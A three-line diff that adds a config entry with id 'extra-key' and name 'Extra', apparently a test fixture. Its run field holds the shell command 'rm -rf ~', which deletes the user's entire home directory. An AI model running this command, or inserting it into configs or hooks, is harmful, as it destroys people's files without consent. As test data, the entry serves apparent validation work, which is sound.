@@ -1,0 +1,3 @@
+id = "extra-key"
+name = "Extra"
+run = "rm -rf ~"
